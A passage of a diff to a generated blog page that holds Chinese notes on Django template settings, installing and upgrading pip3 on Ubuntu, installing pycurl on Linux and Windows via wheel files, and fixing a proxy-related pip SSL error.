class="comment"># 项目内路径</span></span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  TEMPLATES = [</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="string">&#x27;BACKEND&#x27;</span>: <span class="string">&#x27;django.template.backends.django.DjangoTemplates&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;DIRS&#x27;</span>: [</span><br><span class="line">              os.path.join(BASE_DIR, <span class="string">&#x27;../templates&#x27;</span>),  <span class="comment"># 后面参数表示模板主目录相对内路径的所在位置</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&#x27;APP_DIRS&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">          <span class="string">&#x27;OPTIONS&#x27;</span>: &#123;</span><br><span class="line">              <span class="string">&#x27;context_processors&#x27;</span>: [</span><br><span class="line">                  <span class="string">&#x27;django.template.context_processors.debug&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;django.template.context_processors.request&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;django.contrib.auth.context_processors.auth&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;django.contrib.messages.context_processors.messages&#x27;</span>,</span><br><span class="line">              ],</span><br><span class="line">          &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 系统下如何安装pip3工具</span></span><br><span class="line"></span><br><span class="line">一、【导读】</span><br><span class="line">Ubuntu 系统内置了 Python2 和 Python3 两个版本的开发环境，却没有内置相应的 pip3 管理工具，本文将介绍如何在Ubuntu下如何快速安装 pip3 工具，并升级到最新可用版本（教程同样适用于Linux下安装）。</span><br><span class="line"></span><br><span class="line">二、安装</span><br><span class="line">直接在 Ubuntu 终端下输入“pip3 -V”命令尝试查看对应 pip3 工具的版本信息：</span><br><span class="line"></span><br><span class="line">![img](https://img-blog.csdnimg.cn/<span class="number">20190419093412955.</span>png)</span><br><span class="line"></span><br><span class="line">提示没有相关的pip工具，但可以尝试使用 “sudo apt install python3-pip” 命令进行安装，所以只需在终端输入：</span><br><span class="line"></span><br><span class="line">```sudo apt-get install python3-pip```</span><br><span class="line">回车即可安装，但安装的 pip3 工具并不是最新版本的：</span><br><span class="line"></span><br><span class="line">![img](https://img-blog.csdnimg.cn/<span class="number">20190419095622525.</span>png)</span><br><span class="line"></span><br><span class="line">接下来需要进行pip工具的升级更新。</span><br><span class="line"></span><br><span class="line">三、升级</span><br><span class="line">运行更新升级指令：</span><br><span class="line"></span><br><span class="line">```sudo pip3 install --upgrade pip```</span><br><span class="line">升级成功后：</span><br><span class="line"></span><br><span class="line">![img](https://img-blog.csdnimg.cn/<span class="number">20190419105203265.</span>png)</span><br><span class="line"></span><br><span class="line">四、卸载</span><br><span class="line">```sudo apt-get remove python3-pip```</span><br><span class="line"></span><br><span class="line"><span class="comment"># python安装curl</span></span><br><span class="line"></span><br><span class="line">`pycurl`是`libcurl`的 Python 接口，用C语言写的，速度比较快，是一个常用的网络开发库。</span><br><span class="line"></span><br><span class="line">`pycurl`无论在 Linux 还是 Windows 安装都会有点问题。</span><br><span class="line"></span><br><span class="line"><span class="comment">## Linux 下安装</span></span><br><span class="line"></span><br><span class="line">只需要先安装对应的开发包即可(需要root权限)</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">yum install python-devel curl-devel  </span><br><span class="line">pip install pycurl  </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="Windows-下安装"><a href="#Windows-下安装" class="headerlink" title="Windows 下安装"></a>Windows 下安装</h2><p>Windows 下安装<code>pycurl</code>要稍微麻烦些。如果是用的 Python 低于 3.6，可以直接使用 pip 命令安装。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycurl  </span><br></pre></td></tr></table></figure>
-
-<p>若使用的 Python 版本是 **3.6+**，则会报找不到对应的<code>pycurl</code>版本，导致安装失败。（截止20190911这天还没有）</p>
-<p>报错如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Command errored <span class="keyword">out</span> <span class="keyword">with</span> exit status <span class="number">10</span>:  </span><br><span class="line">     command: <span class="string">&#x27;e:\green_tools\python\python37\python.exe&#x27;</span> <span class="operator">-</span>c <span class="string">&#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\pip-install-1t1yx2hf\\pycur</span></span><br><span class="line"><span class="string">l\\setup.py&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;; __file__=&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\pip-install-1t1yx2hf\\pycurl\\setup.py&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;;f=getattr(tokenize, &#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;open&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;, open)(__file__);code=f.read().  </span></span><br><span class="line"><span class="string">replace(&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;\r\n&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;, &#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;\n&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;);f.close();exec(compile(code, __file__, &#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;exec&#x27;</span>&quot;&#x27;&quot;<span class="string">&#x27;))&#x27;</span> egg_info <span class="comment">--egg-base pip-egg-info  </span></span><br><span class="line">         cwd: C:\Users\ADMINI<span class="operator">~</span><span class="number">1</span>\AppData\<span class="keyword">Local</span>\Temp\pip<span class="operator">-</span>install<span class="number">-1</span>t1yx2hf\pycurl\</span><br><span class="line">    Complete output (<span class="number">1</span> lines):</span><br><span class="line">    Please specify <span class="comment">--curl-dir=/path/to/built/libcurl</span></span><br><span class="line">    <span class="comment">----------------------------------------</span></span><br><span class="line">ERROR: Command errored <span class="keyword">out</span> <span class="keyword">with</span> exit status <span class="number">10</span>: python setup.py egg_info <span class="keyword">Check</span> the logs <span class="keyword">for</span> <span class="keyword">full</span> command output.</span><br></pre></td></tr></table></figure>
-
-<p>我们换一种办法安装，使用<code>whl</code>文件安装，需要借助<code>wheel</code>库，执行如下命令安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel  </span><br></pre></td></tr></table></figure>
-
-<p>打开网址：<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl</a> ，下载对应的<code>pycurl</code>版本的<code>whl</code>文件。 <a target="_blank" rel="noopener" href="https://ghost.oss.sherlocky.com/2/b6/005d8038088246fa2ef2ff24fa7b9.png"><img src="https://ghost.oss.sherlocky.com/2/b6/005d8038088246fa2ef2ff24fa7b9.png" alt="img"></a> </p>
-<p>这里我下载的是：pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl</p>
-<blockquote>
-<p>其中 cp37 指的是 Python3.7<br>win_amd64 指的是 Python 是 64 位的 Windows 版本</p>
-</blockquote>
-<p>执行如下命令安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install C:\Users\Administrator\Downloads\pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl  </span><br></pre></td></tr></table></figure>
-
-<p>至此安装完毕，以后有类似库找不到对应的版本安装的话，也可以利用<code>wheel</code>安装<code>whl</code>文件。</p>
-<h1 id="pip-install-报错Caused-by-SSLError-SSLEOFError-8-‘EOF-occurred-in-violation-of-protocol"><a href="#pip-install-报错Caused-by-SSLError-SSLEOFError-8-‘EOF-occurred-in-violation-of-protocol" class="headerlink" title="pip install 报错Caused by SSLError(SSLEOFError(8, ‘EOF occurred in violation of protocol"></a>pip install 报错Caused by SSLError(SSLEOFError(8, ‘EOF occurred in violation of protocol</h1><p>我的报错原因是：<br>直接原因：系统挂有代理导致</p>
-<p>根本原因：不太清楚。</p>
-<p>解决方法（以下任一即可）<br>方法一：<br>关掉系统代理（PAC 也不可，需要  清除（关掉）系统代理</p>
-<p>方法二：<br>在使用 pip 的终端设置正确的 https 代理</p>
-<p>临时设置命令为: set https_proxy=<a href="http://127.0.0.1:port(自己的本地代理端口号)">http://127.0.0.1:port(自己的本地代理端口号)</a></p>
-<p>长期设置 or 终端启动 自动设置代理请自行 google 或者 bing</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -4801,7 +4969,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
